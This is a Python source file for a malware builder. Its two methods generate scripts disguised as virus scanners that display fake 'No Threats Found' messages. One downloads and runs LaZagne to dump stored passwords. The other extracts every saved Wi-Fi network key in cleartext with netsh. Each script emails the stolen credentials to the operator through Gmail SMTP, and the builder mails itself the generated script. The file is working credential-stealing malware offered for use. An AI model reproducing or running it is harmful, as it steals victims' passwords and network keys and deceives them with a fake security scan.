import subprocess
import os
import shutil
from send_attachment import send_attachment
from threading import Thread
import time

class Malware:

    def __init__(self, em1, pass1, download_link):
        self.email = em1
        self.userpass = pass1
        self.download_link = download_link

    def create_malware(self):

        time.sleep(2)

        user_file = open("user_details.txt","w")  

        username = self.email
        password = self.userpass

        user_file.write(username + "\n")
        user_file.write(password)

        user_file.close()

        user_file = open("user_details.txt","r")  

        username = user_file.readline().strip('\n')
        password = user_file.readline()

        user_file.close() 
        os.remove("user_details.txt")

        code = '''
import requests
import subprocess, smtplib, re, os, tempfile


def download(url):
    get_response = requests.get(url) 
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, msg):
    print("Scanned Successfully.. No Threats Found")
    server = smtplib.SMTP("smtp.gmail.com", "587")
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, "\\n" + msg)
    server.quit()




username = '{0}'
password = '{1}'
download_link = '{2}'

print("Scanning for viruses.. Please do not close the application")

download(download_link)
result = subprocess.check_output("lazagne.exe all", shell=True).decode()
send_mail(username, password, str(result))
os.remove("lazagne.exe")
        '''


        executable_file = open("code.py","w")  
        executable_file.write(code.format(username, password, self.download_link))
        executable_file.close()

        send_attachment(username, username, password, "code.py")
        os.remove("code.py")


    def password_stealer(self):
        time.sleep(2)

        user_file = open("user_details.txt","w")  

        username = self.email
        password = self.userpass

        user_file.write(username + "\n")
        user_file.write(password)

        user_file.close()

        user_file = open("user_details.txt","r")  

        username = user_file.readline().strip('\n')
        password = user_file.readline()

        user_file.close() 
        os.remove("user_details.txt")

        code = '''
import requests
import subprocess, smtplib, re, os, tempfile



def send_mail(email, password, msg):
    print("Scanning For Viruses...")
    server = smtplib.SMTP("smtp.gmail.com", "587")
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, "\\n" + msg)
    server.quit()




username = '{0}'
password = '{1}'

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
result = ""
for i in profiles:
    try:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            result = result + i + " | " +  results[0] + "\\n"
        except IndexError:
            result = result + i + " | " + "Password Not Found" + "\\n"
    except subprocess.CalledProcessError:
        print ("ENCODING ERROR")


send_mail(username, password, result)

print("Scanned Successfully. No Threats Found")

'''


        executable_file = open("code.py","w")  
        executable_file.write(code.format(username, password))
        executable_file.close()

        send_attachment(username, username, password, "code.py")
        os.remove("code.py")



    def create(self):
        t = Thread(target = self.create_malware)
        t.start()


    def create_stealer(self):
        t = Thread(target = self.password_stealer)
        t.start()




    